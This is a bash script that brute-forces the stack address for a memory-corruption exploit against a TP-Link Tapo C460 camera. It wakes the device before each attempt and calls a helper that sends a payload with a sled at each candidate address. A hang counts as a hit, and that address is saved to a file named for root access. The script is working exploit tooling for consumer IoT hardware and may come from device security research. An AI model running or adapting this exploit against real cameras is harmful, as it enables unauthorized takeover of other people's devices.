#!/bin/bash
# Walk the C460 stack window one address at a time, WAKING the unit before every shot.
#
# `tapo_connectap_sc.py brute` logs in once and then fires 16 addresses; if the unit falls
# asleep mid-run the login retries stall the whole thing (the log stayed empty for minutes).
# Waking first and firing a single address keeps every shot inside the ~30 s the unit stays up.
#
# A HANG is the hit: the payload's pc landed in the sled, which pins this boot's stack address.
# It is written to /tmp/c460_root_addr.txt and the walk stops.
#
#   c460_addrscan.sh [start-addr] [count]
set -u
HOST="${HOST:-192.168.4.243}"
MAC="${MAC:-50:3d:d1:e3:e2:07}"
START="${1:-0xbef00000}"
COUNT="${2:-256}"
STEP="${STEP:-0x400}"
OFFSET="${OFFSET:-1024}"
HERE="$(cd "$(dirname "$0")" && pwd)"
PY="${PY:-/opt/homebrew/bin/python3}"
LOG="${LOG:-/tmp/c460_addrscan.log}"
OUTFILE="${OUTFILE:-/tmp/c460_root_addr.txt}"

log() { echo "$(date '+%H:%M:%S') $*" | tee -a "$LOG"; }

log "scan from $START step -$STEP count $COUNT (wake before every shot)"
addr=$(printf '%d' "$START")
i=0
while [ "$i" -lt "$COUNT" ]; do
  i=$((i + 1))
  hex=$(printf '0x%x' "$addr")
  if ! timeout 70 "$PY" "$HERE/tapo_reach.py" "$HOST" --wake-mac "$MAC" --tries 3 >/dev/null 2>&1; then
    log "$i/$COUNT $hex SKIP (no DS)"
    addr=$((addr - STEP))
    continue
  fi
  out=$(timeout 30 "$PY" "$HERE/tapo_connectap_sc.py" brute --host "$HOST" --mac "$MAC" \
        --addr "$hex" --offset "$OFFSET" --count 1 --step "$STEP" --sled 0 --padpc 1 \
        --sledfill --pcround 0x1000 --hang 2>&1)
  verdict=$(printf '%s' "$out" | grep -oE 'HANG|DEAD' | head -1)
  log "$i/$COUNT $hex ${verdict:-no-verdict}"
  case "${verdict:-}" in
    HANG) printf '%s\n' "$hex" > "$OUTFILE"; log "HANG at $hex — recorded"; exit 0 ;;
    "")   printf '%s\n' "$out" | tail -2 | tee -a "$LOG" ;;
  esac
  addr=$((addr - STEP))
done
log "no hang in $COUNT addresses from $START"
exit 1
